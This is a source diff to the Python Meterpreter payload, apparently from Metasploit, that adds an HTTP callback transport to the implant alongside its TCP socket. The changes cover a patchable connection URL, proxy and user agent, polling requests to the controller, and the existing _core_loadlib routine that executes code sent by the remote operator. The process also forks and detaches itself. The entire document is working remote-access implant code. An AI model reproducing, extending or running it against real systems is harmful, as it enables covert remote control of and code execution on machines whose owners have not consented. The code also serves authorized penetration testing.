@@ -18,19 +18,50 @@ except ImportError:
 else:
 	has_windll = hasattr(ctypes, 'windll')
 
+# this MUST be imported for urllib to work on OSX
+try:
+	import SystemConfiguration as osxsc
+	has_osxsc = True
+except ImportError:
+	has_osxsc = False
+
+try:
+	urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
+	if sys.version_info[0] < 3:
+		urllib = __import__('urllib2', fromlist=urllib_imports)
+	else:
+		urllib = __import__('urllib.request', fromlist=urllib_imports)
+except ImportError:
+	has_urllib = False
+else:
+	has_urllib = True
+
 if sys.version_info[0] < 3:
 	is_bytes = lambda obj: issubclass(obj.__class__, str)
 	bytes = lambda *args: str(*args[:1])
 	NULL_BYTE = '\x00'
 else:
+	if isinstance(__builtins__, dict):
+		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
+		str = lambda x: __builtins__['str'](x, 'UTF-8')
+	else:
+		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
+		str = lambda x: __builtins__.str(x, 'UTF-8')
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
-	str = lambda x: __builtins__['str'](x, 'UTF-8')
 	NULL_BYTE = bytes('\x00', 'UTF-8')
+	long = int
 
 #
 # Constants
 #
+
+# these values may be patched, DO NOT CHANGE THEM
 DEBUGGING = False
+HTTP_COMMUNICATION_TIMEOUT = 300
+HTTP_CONNECTION_URL = None
+HTTP_EXPIRATION_TIMEOUT = 604800
+HTTP_PROXY = None
+HTTP_USER_AGENT = None
 
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
@@ -284,15 +315,43 @@ class STDProcess(subprocess.Popen):
 export(STDProcess)
 
 class PythonMeterpreter(object):
-	def __init__(self, socket):
+	def __init__(self, socket=None):
 		self.socket = socket
+		self.driver = None
+		self.running = False
+		self.communications_active = True
+		self.communications_last = 0
+		if self.socket:
+			self.driver = 'tcp'
+		elif HTTP_CONNECTION_URL:
+			self.driver = 'http'
+		self.last_registered_extension = None
 		self.extension_functions = {}
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
 		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
-		self.running = True
+		if self.driver:
+			if hasattr(self, 'driver_init_' + self.driver):
+				getattr(self, 'driver_init_' + self.driver)()
+			self.running = True
+
+	def driver_init_http(self):
+		if HTTP_PROXY:
+			proxy_handler = urllib.ProxyHandler({'http': HTTP_PROXY})
+			opener = urllib.build_opener(proxy_handler)
+		else:
+			opener = urllib.build_opener()
+		if HTTP_USER_AGENT:
+			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
+		urllib.install_opener(opener)
+		self._http_last_seen = time.time()
+		self._http_request_headers = {'Content-Type': 'application/octet-stream'}
+
+	def register_extension(self, extension_name):
+		self.last_registered_extension = extension_name
+		return self.last_registered_extension
 
 	def register_function(self, func):
 		self.extension_functions[func.__name__] = func
@@ -318,19 +377,73 @@ class PythonMeterpreter(object):
 		self.processes[idx] = process
 		return idx
 
+	def get_packet(self):
+		packet = getattr(self, 'get_packet_' + self.driver)()
+		self.communications_last = time.time()
+		if packet:
+			self.communications_active = True
+		return packet
+
+	def send_packet(self, packet):
+		getattr(self, 'send_packet_' + self.driver)(packet)
+		self.communications_last = time.time()
+		self.communications_active = True
+
+	def get_packet_http(self):
+		packet = None
+		request = urllib.Request(HTTP_CONNECTION_URL, bytes('RECV', 'UTF-8'), self._http_request_headers)
+		try:
+			url_h = urllib.urlopen(request)
+			packet = url_h.read()
+		except:
+			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
+				self.running = False
+		else:
+			self._http_last_seen = time.time()
+		if packet:
+			packet = packet[8:]
+		else:
+			packet = None
+		return packet
+
+	def send_packet_http(self, packet):
+		request = urllib.Request(HTTP_CONNECTION_URL, packet, self._http_request_headers)
+		try:
+			url_h = urllib.urlopen(request)
+			response = url_h.read()
+		except:
+			if (time.time() - self._http_last_seen) > HTTP_COMMUNICATION_TIMEOUT:
+				self.running = False
+		else:
+			self._http_last_seen = time.time()
+
+	def get_packet_tcp(self):
+		packet = None
+		if len(select.select([self.socket], [], [], 0.5)[0]):
+			packet = self.socket.recv(8)
+			if len(packet) != 8:
+				self.running = False
+				return None
+			pkt_length, pkt_type = struct.unpack('>II', packet)
+			pkt_length -= 8
+			packet = bytes()
+			while len(packet) < pkt_length:
+				packet += self.socket.recv(4096)
+		return packet
+
+	def send_packet_tcp(self, packet):
+		self.socket.send(packet)
+
 	def run(self):
 		while self.running:
-			if len(select.select([self.socket], [], [], 0.5)[0]):
-				request = self.socket.recv(8)
-				if len(request) != 8:
-					break
-				req_length, req_type = struct.unpack('>II', request)
-				req_length -= 8
-				request = bytes()
-				while len(request) < req_length:
-					request += self.socket.recv(4096)
+			request = None
+			should_get_packet = self.communications_active or ((time.time() - self.communications_last) > 0.5)
+			self.communications_active = False
+			if should_get_packet:
+				request = self.get_packet()
+			if request:
 				response = self.create_response(request)
-				self.socket.send(response)
+				self.send_packet(response)
 			else:
 				# iterate over the keys because self.channels could be modified if one is closed
 				channel_ids = list(self.channels.keys())
@@ -370,7 +483,7 @@ class PythonMeterpreter(object):
 							pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
 							pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
 							pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-							self.socket.send(pkt)
+							self.send_packet(pkt)
 					if data:
 						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 						pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
@@ -379,7 +492,7 @@ class PythonMeterpreter(object):
 						pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
 						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-						self.socket.send(pkt)
+						self.send_packet(pkt)
 
 	def handle_dead_resource_channel(self, channel_id):
 		del self.channels[channel_id]
@@ -390,21 +503,25 @@ class PythonMeterpreter(object):
 		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-		self.socket.send(pkt)
+		self.send_packet(pkt)
 
 	def _core_loadlib(self, request, response):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
 			return ERROR_FAILURE
-		preloadlib_methods = list(self.extension_functions.keys())
+
+		self.last_registered_extension = None
 		symbols_for_extensions = {'meterpreter':self}
 		symbols_for_extensions.update(EXPORTED_SYMBOLS)
 		i = code.InteractiveInterpreter(symbols_for_extensions)
 		i.runcode(compile(data_tlv['value'], '', 'exec'))
-		postloadlib_methods = list(self.extension_functions.keys())
-		new_methods = list(filter(lambda x: x not in preloadlib_methods, postloadlib_methods))
-		for method in new_methods:
-			response += tlv_pack(TLV_TYPE_METHOD, method)
+		extension_name = self.last_registered_extension
+
+		if extension_name:
+			check_extension = lambda x: x.startswith(extension_name)
+			lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
+			for method in lib_methods:
+				response += tlv_pack(TLV_TYPE_METHOD, method)
 		return ERROR_SUCCESS, response
 
 	def _core_shutdown(self, request, response):
@@ -546,5 +663,8 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 			os.setsid()
 		except OSError:
 			pass
-	met = PythonMeterpreter(s)
+	if HTTP_CONNECTION_URL and has_urllib:
+		met = PythonMeterpreter()
+	else:
+		met = PythonMeterpreter(s)
 	met.run()
